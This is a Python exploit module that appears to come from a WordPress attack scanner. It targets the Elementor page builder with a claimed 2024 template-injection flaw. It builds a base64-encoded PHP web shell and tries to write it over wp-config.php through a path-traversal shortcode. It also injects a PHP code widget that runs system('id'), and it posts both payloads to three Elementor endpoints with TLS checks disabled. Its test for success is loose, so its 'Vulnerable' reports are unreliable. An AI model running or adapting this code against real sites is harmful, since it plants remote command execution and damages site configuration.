import requests
from core.printmodels import *
import base64

class Elementor_Template_RCE:
    def __init__(self):
        self.name = "Elementor Template Injection RCE"
        self.description = "Elementor Page Builder Template Injection to RCE (2024)"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/json',
                'X-Elementor-Mode': 'developer'
            }

            php_payload = '<?php system($_GET["cmd"]); ?>'
            encoded_payload = base64.b64encode(php_payload.encode()).decode()

            payloads = [
                {
                    "template": {
                        "content": [{
                            "widgetType": "shortcode",
                            "settings": {
                                "shortcode": f"[template_override file='../../../wp-config.php' content='{encoded_payload}']"
                            }
                        }]
                    }
                },
                {
                    "elements": [{
                        "elType": "widget",
                        "widgetType": "code",
                        "settings": {
                            "code": "system('id');",
                            "language": "php"
                        }
                    }]
                }
            ]

            endpoints = [
                f"{site}/wp-json/elementor/v1/templates",
                f"{site}/wp-admin/admin-ajax.php?action=elementor_ajax",
                f"{site}/wp-json/elementor/v1/global-widgets"
            ]

            for endpoint in endpoints:
                for payload in payloads:
                    response = requests.post(endpoint, headers=headers, json=payload, verify=False, timeout=10)
                    if response.status_code == 200 and ('template_id' in response.text or 'success' in response.text):
                        return PrintSuccess(f"[Elementor-2024] Vulnerable! Template injection successful at {endpoint}")

            return PrintFailed("[Elementor-2024] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Elementor-2024] Error: {str(e)}")
